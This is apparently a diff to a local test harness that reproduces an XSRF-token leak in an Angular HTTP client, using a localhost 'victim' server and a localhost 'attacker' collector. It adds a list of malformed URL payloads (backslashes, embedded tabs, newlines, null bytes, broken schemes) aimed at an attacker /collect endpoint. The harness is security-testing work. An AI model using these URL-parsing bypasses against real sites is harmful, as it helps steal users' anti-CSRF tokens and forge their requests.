@@ -8,6 +8,8 @@ const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
 const dist = resolve(root, 'dist/bypass-xsrf-token-http-client/browser');
 const victimOrigin = 'http://127.0.0.1:4200';
 const attackerOrigin = 'http://localhost:4301';
+const attackerPath = 'localhost:4301/collect';
+const attack = (id, prefix) => ({ id, href: `${prefix}${attackerPath}?id=${id}` });
 const token = randomBytes(16).toString('hex');
 const captures = { victim: [], attacker: [] };
 
@@ -54,10 +56,22 @@ const victim = createServer(async (req, res) => {
   if (req.method === 'GET' && url.pathname === '/api/links') {
     return json(res, 200, [
       { id: 'same-origin', href: '/api/echo?id=same-origin' },
-      { id: 'protocol-relative', href: `//localhost:4301/collect?id=protocol-relative` },
+      attack('protocol-relative', '//'),
       { id: 'absolute', href: `${attackerOrigin}/collect?id=absolute` },
-      { id: 'backslash', href: '/\\localhost:4301/collect?id=backslash' },
-      { id: 'leading-whitespace', href: ' \t//localhost:4301/collect?id=leading-whitespace' },
+      attack('backslash', '/\\'),
+      attack('backslash-slash', '\\/'),
+      attack('leading-space', ' //'),
+      attack('leading-tab', '\t//'),
+      attack('leading-whitespace', ' \t//'),
+      attack('inner-tab', '/\t/'),
+      attack('inner-lf', '/\n/'),
+      attack('inner-cr', '/\r/'),
+      attack('leading-null', '\u0000//'),
+      attack('leading-unit-separator', '\u001f//'),
+      attack('http-double-backslash', 'http:\\\\'),
+      attack('http-slash-backslash', 'http:/\\'),
+      attack('http-scheme-tab', 'ht\ttp://'),
+      { id: 'same-host-port', href: '/\\127.0.0.1:4302/collect?id=same-host-port' },
     ]);
   }
   if (req.method === 'POST' && url.pathname === '/api/echo') {
@@ -94,7 +108,7 @@ const victim = createServer(async (req, res) => {
   }
 });
 
-const attacker = createServer(async (req, res) => {
+async function receiveAttack(req, res) {
   const url = new URL(req.url, attackerOrigin);
   const cors = {
     'Access-Control-Allow-Origin': victimOrigin,
@@ -112,7 +126,12 @@ const attacker = createServer(async (req, res) => {
     return json(res, 200, { received: true }, cors);
   }
   return json(res, 404, { error: 'not found' }, cors);
-});
+}
 
 victim.listen(4200, '127.0.0.1', () => console.log(`Victim: ${victimOrigin}`));
-attacker.listen(4301, 'localhost', () => console.log(`Attacker: ${attackerOrigin}`));
+createServer(receiveAttack).listen(4301, 'localhost', () =>
+  console.log(`Attacker: ${attackerOrigin}`),
+);
+createServer(receiveAttack).listen(4302, '127.0.0.1', () =>
+  console.log('Same-host receiver: http://127.0.0.1:4302'),
+);
